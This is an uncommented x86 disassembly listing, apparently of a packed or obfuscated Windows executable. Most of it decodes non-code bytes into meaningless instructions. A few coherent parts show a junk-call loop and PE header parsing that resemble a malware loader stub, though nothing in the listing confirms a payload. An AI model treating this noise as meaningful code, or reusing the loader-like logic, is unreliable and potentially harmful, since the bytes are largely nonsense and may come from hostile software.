  409cef:	mov    esi,0x214a2885
  409cf4:	push   0x13
  409cf6:	cwde   
  409cf7:	addr16 xchg esi,eax
  409cf9:	inc    esp
  409cfa:	hlt    
  409cfb:	out    0xd3,eax
  409cfd:	add    edx,esp
  409cff:	pop    ss
  409d00:	jmp    0xad25:0x854493ed
  409d07:	xchg   DWORD PTR [ebx+0x26fa78c9],edx
  409d0d:	inc    ecx
  409d0e:	lahf   
  409d0f:	jne    0x409cc2
  409d11:	sbb    BYTE PTR ds:0x6f9f2007,0x59
  409d18:	loope  0x409cb3
  409d1a:	and    DWORD PTR [esi+0x72e6597c],eax
  409d20:	cld    
  409d21:	pop    eax
  409d22:	fimul  WORD PTR [eax]
  409d24:	dec    ecx
  409d25:	mov    cl,0x8
  409d27:	sbb    ebp,DWORD PTR [ebx+eax*4]
  409d2a:	loop   0x409d6a
  409d2c:	dec    esp
  409d2d:	push   edi
  409d2e:	stos   DWORD PTR es:[edi],eax
  409d2f:	jp     0x409d46
  409d31:	call   0x869a:0xcc1390bd
  409d38:	lods   eax,DWORD PTR ds:[esi]
  409d39:	inc    edx
  409d3a:	xchg   edx,eax
  409d3b:	ss jns 0x409cf3
  409d3e:	inc    esi
  409d3f:	adc    ebx,esp
  409d41:	push   0xffffffb2
  409d43:	xchg   ebp,eax
  409d44:	inc    ebx
  409d45:	sub    bh,ah
  409d47:	aad    0xae
  409d49:	xchg   esp,eax
  409d4a:	mov    ecx,0xefbe89f4
  409d4f:	push   eax
  409d50:	fdiv   DWORD PTR [edi]
  409d52:	inc    ecx
  409d53:	out    dx,eax
  409d54:	cmp    DWORD PTR [esi+0x49],ebp
  409d57:	and    BYTE PTR [ecx],ch
  409d59:	sbb    al,0x5c
  409d5b:	and    DWORD PTR [edi],edx
  409d5d:	in     eax,0x53
  409d5f:	pop    ecx
  409d60:	mov    bh,0x31
  409d62:	fbstp  TBYTE PTR ds:0xe6d16f33
  409d68:	push   0xe1cf2c82
  409d6d:	ret    0x3577
  409d70:	neg    BYTE PTR [eax+ebp*2+0x7a]
  409d74:	jp     0x409da7
  409d76:	push   esp
  409d77:	hlt    
  409d78:	push   cs
  409d79:	sbb    al,0x7f
  409d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7c:	dec    ebx
  409d7d:	xchg   esp,eax
  409d7e:	mov    ebp,0xc0f1164c
  409d83:	aas    
  409d84:	sbb    cl,al
  409d86:	jmp    0x409dae
  409d88:	pop    esi
  409d89:	fisubr DWORD PTR [eax+0x4]
  409d8c:	fild   QWORD PTR [ecx]
  409d8e:	daa    
  409d8f:	dec    ebx
  409d90:	sbb    eax,0x2641af46
  409d95:	jmp    0x3634e764
  409d9a:	pop    DWORD PTR [edx+edi*8]
  409d9d:	xlat   BYTE PTR fs:[ebx]
  409d9f:	jnp    0x409ddc
  409da1:	adc    bh,BYTE PTR [edx-0x6a0731]
  409da7:	xor    eax,DWORD PTR [edi+0x25]
  409daa:	mov    bh,0x64
  409dac:	rcr    DWORD PTR [ebx],1
  409dae:	cmp    edi,DWORD PTR [edx-0x46]
  409db1:	pushf  
  409db2:	xor    BYTE PTR [ebp-0x5],al
  409db5:	test   eax,0xfa5f6cad
  409dba:	or     eax,0x8577655a
  409dbf:	test   ebp,ecx
  409dc1:	push   0x21
  409dc3:	sbb    BYTE PTR [esi],bl
  409dc5:	std    
  409dc6:	retf   0x49b8
  409dc9:	mov    bl,0x64
  409dcb:	jge    0x409d9b
  409dcd:	mov    bl,0x6f
  409dcf:	push   ss
  409dd0:	and    eax,0x2b0b7f7
  409dd5:	cmp    esi,DWORD PTR [ebx]
  409dd7:	ins    BYTE PTR es:[edi],dx
  409dd8:	inc    esp
  409dd9:	xor    eax,0x8e109adf
  409dde:	leave  
  409ddf:	out    dx,al
  409de0:	(bad)  
  409de1:	iret   
  409de2:	ret    0xde7b
  409de5:	or     DWORD PTR [edx],0xfffffffb
  409de8:	call   0x18e3af6f
  409ded:	mov    ecx,0x28e0e53d
  409df2:	xchg   edi,eax
  409df3:	fldcw  WORD PTR [ebp-0x1860aa7d]
  409df9:	xor    BYTE PTR [edx],bl
  409dfb:	das    
  409dfc:	int3   
  409dfd:	(bad)  
  409dfe:	fsubr  DWORD PTR [ebp+0x3fa07083]
  409e04:	sbb    BYTE PTR [ecx],cl
  409e06:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  409e08:	and    eax,0x99607e3a
  409e0d:	mov    al,0xe8
  409e0f:	imul   ebx,DWORD PTR [ebx],0xffffffc8
  409e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e13:	xor    BYTE PTR ds:0xb1b60cca,cl
  409e19:	cmp    al,0xdf
  409e1b:	dec    edi
  409e1c:	ret    0xc324
  409e1f:	cmp    al,0xcb
  409e21:	mov    DWORD PTR ds:0x4248c2,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x410757,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x448988,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x4454dc
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x4454e8
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x410743,0x1d
  409e6c:	cmp    DWORD PTR ds:0x410743,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x410743,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x443044
  409ea2:	mov    eax,ds:0x410743
  409ea7:	dec    eax
  409ea8:	mov    ds:0x410743,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi+0x7ab83ad5],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	mov    ch,0x15
  409ee7:	popf   
  409ee8:	xor    BYTE PTR [eax+0x18],bh
  409eeb:	fs cdq 
  409eed:	sub    bl,dl
  409eef:	sbb    al,0x2c
  409ef1:	rol    BYTE PTR [esi+0x13],0xa2
  409ef5:	lods   al,BYTE PTR ds:[esi]
  409ef6:	cmc    
  409ef7:	test   eax,0x29c8534f
  409efc:	jecxz  0x409f10
  409efe:	add    DWORD PTR [eax+0xe],esp
  409f01:	out    dx,al
  409f02:	repz add eax,0xc79af993
  409f08:	adc    eax,DWORD PTR [edi+ecx*2]
  409f0b:	xchg   edi,eax
  409f0c:	stos   DWORD PTR es:[edi],eax
  409f0d:	inc    ebx
  409f0e:	mov    ds,WORD PTR [ebx+edi*4]
  409f11:	mov    bh,0x25
  409f13:	pop    eax
  409f14:	int    0x27
  409f16:	rol    BYTE PTR [ebx-0x76aa9f77],0x62
  409f1d:	and    ebx,DWORD PTR [eax+0x40]
  409f20:	aam    0xcd
  409f22:	ret    0x159a
  409f25:	add    dl,BYTE PTR [edi-0x4a]
  409f28:	das    
  409f29:	fdivr  QWORD PTR [esi+0x1a027eab]
  409f2f:	int    0xb4
  409f31:	mov    cl,BYTE PTR [ecx-0x710f713d]
  409f37:	xchg   ecx,eax
  409f38:	add    eax,0x1e6b9111
  409f3d:	bound  esi,QWORD PTR [ecx+eax*2-0x50860d28]
  409f44:	pop    ecx
  409f45:	inc    esi
  409f46:	aam    0xf5
  409f48:	test   DWORD PTR [ecx],esi
  409f4a:	mov    ds:0x7d523cc3,eax
  409f4f:	imul   edi,DWORD PTR [edx-0x64268b21],0x4c
  409f56:	inc    DWORD PTR [esi+0x17]
  409f59:	xor    al,0x6e
  409f5b:	sub    DWORD PTR [eax],esp
  409f5d:	call   0x41368b35
  409f62:	(bad)
  409f65:	jge    0x409f0e
  409f67:	sub    BYTE PTR [edi],0x45
  409f6a:	push   esp
  409f6b:	pop    ecx
  409f6c:	(bad)  
  409f6d:	retf   
  409f6e:	out    0x4e,al
  409f70:	fcmovne st,st(0)
  409f72:	mov    ah,0x20
  409f74:	int3   
  409f75:	jecxz  0x409ef9
  409f77:	fiadd  WORD PTR [esi+0x2a85b245]
  409f7d:	mov    edi,0xd36042f9
  409f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f83:	sbb    DWORD PTR [eax-0x499fcc64],0xb393429
  409f8d:	outs   dx,BYTE PTR ds:[esi]
  409f8e:	jmp    0x8696:0x31b53f9e
  409f95:	test   BYTE PTR [ebp+0x42572d05],ch
  409f9b:	and    ch,BYTE PTR [esi-0x69]
  409f9e:	lea    esp,[edi-0x26]
  409fa1:	cld    
  409fa2:	jo     0x409f39
  409fa4:	rol    BYTE PTR [eax+0xb0d2e56],0xd5
  409fab:	jb     0x409f9c
  409fad:	pop    es
  409fae:	shl    DWORD PTR [eax+0x71],1
  409fb1:	loop   0x409fc9
  409fb3:	mov    ?,ebp
  409fb5:	popa   
  409fb6:	ds dec ebp
  409fb8:	ss push 0xffffffed
  409fbb:	cmp    ebp,eax
  409fbd:	repnz xchg ecx,eax
  409fbf:	ss pop edi
  409fc1:	mov    eax,edi
  409fc3:	mov    eax,0x6d621ac9
  409fc8:	mov    al,0x93
  409fca:	enter  0x8b98,0x53
  409fce:	xchg   esi,eax
  409fcf:	es jl  0x409fa8
  409fd2:	and    eax,DWORD PTR [ebp+0x6f]
  409fd5:	lea    esp,[edx+0x25]
  409fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd9:	ret    0xa121
  409fdc:	cmp    cl,bl
  409fde:	mov    cl,0xf1
  409fe0:	in     al,0xea
  409fe2:	bnd jle 0x409f92
  409fe5:	sub    al,0xa2
  409fe7:	ret    0x5f60
  409fea:	xchg   ebp,eax
  409feb:	pop    ds
  409fec:	push   es
  409fed:	enter  0x4cb5,0xaf
  409ff1:	(bad)  
  409ff2:	cwde   
  409ff3:	cmp    DWORD PTR [edx-0x15],eax
  409ff6:	mov    ds:0xc0956d26,al
  409ffb:	shl    BYTE PTR [ebp-0x2f5a6d01],0x3e
  40a002:	mov    ds:0x790db52a,eax
  40a007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a008:	mov    ch,0x20
  40a00a:	test   al,0xfb
  40a00c:	jnp    0x409fcc
  40a00e:	sahf   
  40a00f:	in     eax,dx
  40a010:	xchg   ecx,eax
  40a011:	test   BYTE PTR ds:0xd3327b97,bh
  40a017:	test   al,0xd6
  40a019:	fisubr DWORD PTR [eax]
  40a01b:	pusha  
  40a01c:	out    0xb0,al
  40a01e:	xchg   edx,eax
  40a01f:	sbb    DWORD PTR [edx+0x4ebef877],ecx
  40a025:	lahf   
  40a026:	pop    ebp
  40a027:	mov    dl,0x68
  40a029:	lock js 0x409fca
  40a02c:	or     al,0xa6
  40a02e:	daa    
  40a02f:	shl    bl,0xab
  40a032:	ds pop esi
  40a034:	je     0x40a1ad
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    DWORD PTR [ecx-0x223f2a6e],ecx
  40a058:	lds    edi,FWORD PTR [esp+edi*2-0x36]
  40a05c:	jg     0x40a0da
  40a05e:	jl     0x40a047
  40a060:	jmp    FWORD PTR [edx]
  40a062:	dec    ebp
  40a063:	add    eax,0x9a2c12e2
  40a068:	lock scas al,BYTE PTR es:[edi]
  40a06a:	jg     0x40a002
  40a06c:	in     eax,0x20
  40a06e:	adc    al,0x76
  40a070:	and    al,ah
  40a072:	pop    ebx
  40a073:	cmp    al,0xd8
  40a075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a076:	xor    al,BYTE PTR [edi-0x30a2a0e5]
  40a07c:	into   
  40a07d:	inc    esp
  40a07e:	xor    ebp,DWORD PTR [ecx]
  40a080:	cdq    
  40a081:	mov    ds,edi
  40a083:	dec    esi
  40a084:	div    esi
  40a086:	mov    cl,0xfd
  40a088:	fs adc ebp,esp
  40a08b:	dec    esi
  40a08c:	popf   
  40a08d:	out    dx,al
  40a08e:	aam    0x50
  40a090:	jmp    0x7dd3:0xeecf967c
  40a097:	std    
  40a098:	repnz mov ?,WORD PTR [eax-0x34]
  40a09c:	mov    eax,ds:0x5734008d
  40a0a1:	inc    eax
  40a0a2:	dec    ecx
  40a0a3:	add    edi,DWORD PTR [edi-0x6f]
  40a0a6:	hlt    
  40a0a7:	out    0x39,al
  40a0a9:	and    eax,0x85d9f45e
  40a0ae:	lock fsubr DWORD PTR [ebx+0x72]
  40a0b2:	in     eax,0x73
  40a0b4:	ins    DWORD PTR es:[edi],dx
  40a0b5:	bound  esi,QWORD PTR [esi-0x20]
  40a0b8:	imul   ecx,DWORD PTR [edx-0xf1f29a8],0x2fe999fd
  40a0c2:	fild   DWORD PTR [ecx-0x37071491]
  40a0c8:	call   0xfb0c:0x8c948018
  40a0cf:	sti    
  40a0d0:	out    0xdb,eax
  40a0d2:	mov    ds:0x2af305,al
  40a0d7:	jne    0x40a0eb
  40a0d9:	nop
  40a0da:	cmc    
  40a0db:	iret   
  40a0dc:	and    eax,0x92de9d92
  40a0e1:	mov    dl,0x37
  40a0e3:	push   ecx
  40a0e4:	arpl   WORD PTR [edi-0x2fc3ad83],sp
  40a0ea:	and    DWORD PTR [eax-0x41b059af],edi
  40a0f0:	das    
  40a0f1:	sub    eax,0x5f2dc969
  40a0f6:	rcl    DWORD PTR [ebp-0x2c225f37],1
  40a0fc:	pop    esi
  40a0fd:	imul   edi,DWORD PTR [ecx-0x68cb1d52],0xffffff9c
  40a104:	cli    
  40a105:	imul   ecx,DWORD PTR [ecx+0x5d],0xfd7f89f4
  40a10c:	adc    ecx,DWORD PTR [ebx]
  40a10e:	pop    esi
  40a10f:	pop    es
  40a110:	mov    al,0xaf
  40a112:	adc    dl,ah
  40a114:	shr    DWORD PTR [esi-0x4ce32152],0xe7
  40a11b:	push   es
  40a11c:	(bad)  
  40a11d:	xlat   BYTE PTR ds:[ebx]
  40a11e:	addr16 aam 0x3b
  40a121:	add    ecx,esp
  40a123:	lea    ebx,[esi-0x6b7b7b13]
  40a129:	test   eax,0x6c93a0e1
  40a12e:	cwde   
  40a12f:	xlat   BYTE PTR ds:[ebx]
  40a130:	jg     0x40a1ad
  40a132:	push   ds
  40a133:	aaa    
  40a134:	add    esi,DWORD PTR [ecx-0x1]
  40a137:	push   ss
  40a138:	mov    bl,0x1d
  40a13a:	pop    es
  40a13b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a13c:	clc    
  40a13d:	mov    ds:0x7347abd0,eax
  40a142:	fsubr  DWORD PTR [edi+0x1f64000e]
  40a148:	jge    0x40a0d4
  40a14a:	sub    ebp,edi
  40a14c:	dec    edi
  40a14d:	push   0x3c
  40a14f:	(bad)  
  40a151:	mov    ch,0x26
  40a153:	xchg   bl,dl
  40a155:	xor    ecx,DWORD PTR [eax+0x7b]
  40a158:	dec    ebp
  40a159:	dec    esi
  40a15a:	(bad)  
  40a15b:	imul   ebx,DWORD PTR [esp+ecx*4],0x36
  40a15f:	add    al,0x4d
  40a161:	push   ss
  40a162:	sbb    dl,al
  40a164:	cdq    
  40a165:	dec    edx
  40a166:	or     DWORD PTR [eax+0x22ccd151],ebx
  40a16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16d:	jmp    0x5bf8:0xed5eb180
  40a174:	jp     0x40a161
  40a176:	push   ds
  40a177:	retf   0x56fa
  40a17a:	xor    eax,0xb2ebd50d
  40a17f:	mov    eax,0x7cc3215e
  40a184:	in     eax,0xe4
  40a186:	push   0x3e47667f
  40a18b:	aaa    
  40a18c:	xor    BYTE PTR [edi+0x95f67f],ah
  40a192:	jl     0x40a180
  40a194:	cmp    al,0x15
  40a196:	cwde   
  40a197:	(bad)  
  40a198:	sbb    BYTE PTR [ecx+0x7cf10740],bh
  40a19e:	adc    al,0x23
  40a1a0:	mov    eax,ds:0x61321bf1
  40a1a5:	push   esi
  40a1a6:	jmp    0x40a1cd
  40a1a8:	pop    ebp
  40a1a9:	push   ss
  40a1aa:	cmp    DWORD PTR [edx-0x3ba74b2],eax
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	fisub  WORD PTR ds:0xabd2c81c
  40a1c6:	les    edi,FWORD PTR [esp+edi*2-0x36]
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a197
  40a1ce:	movnti DWORD PTR [edx+0x65cd2e41],ecx
  40a1d5:	mov    al,ds:0x21083d32
  40a1da:	jbe    0x40a237
  40a1dc:	dec    edx
  40a1dd:	dec    edi
  40a1de:	les    ecx,FWORD PTR [ebp+0x1a]
  40a1e1:	mov    edi,0xd309c838
  40a1e6:	dec    edx
  40a1e7:	jmp    0x40a1fb
  40a1e9:	and    dh,BYTE PTR [ecx-0xa]
  40a1ec:	leave  
  40a1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ee:	add    DWORD PTR [eax],esi
  40a1f0:	cmp    ch,bl
  40a1f2:	mov    edi,0x5c978e3b
  40a1f7:	std    
  40a1f8:	inc    ebp
  40a1f9:	sub    DWORD PTR [ebp-0x66],eax
  40a1fc:	icebp  
  40a1fd:	dec    esi
  40a1fe:	pop    ss
  40a1ff:	les    edi,FWORD PTR ds:0xeb71fe6b
  40a205:	adc    eax,0x65da6740
  40a20a:	xor    eax,0x6a4c2a7
  40a20f:	xor    DWORD PTR [edi-0x5a],0x67
  40a213:	mov    edi,0x104450e7
  40a218:	or     BYTE PTR [bx+di],dl
  40a21b:	icebp  
  40a21c:	into   
  40a21d:	ins    DWORD PTR es:[edi],dx
  40a21e:	mov    DWORD PTR [ebx-0x7a],esi
  40a221:	adc    edx,DWORD PTR [eax+0x64]
  40a224:	mov    al,0x2
  40a226:	ficom  WORD PTR [ebp-0x6abda629]
  40a22c:	hlt    
  40a22d:	adc    DWORD PTR ds:0x7acf059f,ecx
  40a233:	push   ebx
  40a234:	cmp    al,0xaf
  40a236:	mov    eax,ds:0x8405f7c
  40a23b:	mov    BYTE PTR [edi+0x62f28864],bl
  40a241:	dec    BYTE PTR [eax-0x73]
  40a244:	push   esi
  40a245:	or     dh,bl
  40a247:	jmp    0x40a2ad
  40a249:	std    
  40a24a:	data16 es into 
  40a24d:	out    dx,eax
  40a24e:	lods   al,BYTE PTR ds:[esi]
  40a24f:	add    DWORD PTR [ecx-0x56bb5313],edi
  40a255:	scas   al,BYTE PTR es:[edi]
  40a256:	jbe    0x40a237
  40a258:	sub    ebx,edi
  40a25a:	mov    edi,0x1efcd4f6
  40a25f:	aaa    
  40a260:	push   esi
  40a261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a262:	stos   BYTE PTR es:[edi],al
  40a263:	stos   BYTE PTR es:[edi],al
  40a264:	mov    ecx,0x99586d2c
  40a269:	or     cl,BYTE PTR [ebp-0x32]
  40a26c:	sahf   
  40a26d:	xchg   ecx,eax
  40a26e:	test   DWORD PTR [edi-0x6e],ebx
  40a271:	push   edx
  40a272:	push   eax
  40a273:	scas   al,BYTE PTR es:[edi]
  40a274:	mov    BYTE PTR [edi],ah
  40a276:	or     eax,0xbcb11df1
  40a27b:	inc    ebp
  40a27c:	std    
  40a27d:	sbb    edx,DWORD PTR [eax-0x73bb1716]
  40a283:	repz lds esi,FWORD PTR [ebp-0x517722ce]
  40a28a:	jns    0x40a289
  40a28c:	dec    ecx
  40a28d:	shr    ecx,1
  40a28f:	and    BYTE PTR [eax-0x58],ah
  40a292:	outs   dx,DWORD PTR ds:[esi]
  40a293:	pop    edx
  40a294:	jmp    0x40a236
  40a296:	mov    ds:0x2865ab4a,al
  40a29b:	sbb    al,0x98
  40a29d:	ror    BYTE PTR [ebx-0x4a],1
  40a2a0:	lahf   
  40a2a1:	mov    ebx,0x14ae14a3
  40a2a6:	jnp    0x40a311
  40a2a8:	scas   eax,DWORD PTR es:[edi]
  40a2a9:	pop    ebx
  40a2aa:	leave  
  40a2ab:	ds out dx,eax
  40a2ad:	(bad)  
  40a2ae:	nop
  40a2af:	xchg   esi,eax
  40a2b0:	xchg   edi,eax
  40a2b1:	clc    
  40a2b2:	mov    ds:0x946bdec8,al
  40a2b7:	das    
  40a2b8:	aas    
  40a2b9:	add    eax,DWORD PTR [edx]
  40a2bb:	dec    edi
  40a2bc:	test   DWORD PTR [ebp+0x5cab9dab],ecx
  40a2c2:	or     esp,DWORD PTR [ecx]
  40a2c4:	ret    0x4a0e
  40a2c7:	nop
  40a2c8:	pop    es
  40a2c9:	adc    ebx,esp
  40a2cb:	mov    gs,WORD PTR [ebp+0x110366ce]
  40a2d1:	xchg   ebp,eax
  40a2d2:	(bad)  
  40a2d3:	cmc    
  40a2d4:	and    edi,esi
  40a2d6:	fxch   st(6)
  40a2d8:	add    al,0xef
  40a2da:	loope  0x40a279
  40a2dc:	sbb    esi,DWORD PTR [ebx+edx*1]
  40a2df:	ffree  st(0)
  40a2e1:	jg     0x40a2c9
  40a2e3:	add    BYTE PTR ds:0xe073d476,ch
  40a2e9:	jae    0x40a328
  40a2eb:	mov    edx,esp
  40a2ed:	add    eax,0x4c27c495
  40a2f2:	repnz xchg ebp,eax
  40a2f4:	in     eax,dx
  40a2f5:	adc    eax,0xf292bb20
  40a2fa:	and    ebx,0x2d436e9d
  40a300:	and    DWORD PTR [edi+0x679260d6],esi
  40a306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a307:	inc    DWORD PTR [ebp-0x6a530baf]
  40a30d:	inc    esi
  40a30e:	ror    dl,cl
  40a310:	in     al,0x11
  40a312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a313:	lds    esp,FWORD PTR [edi+0x52cbb334]
  40a319:	icebp  
  40a31a:	stc    
  40a31b:	xor    eax,edx
  40a31d:	add    eax,ecx
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
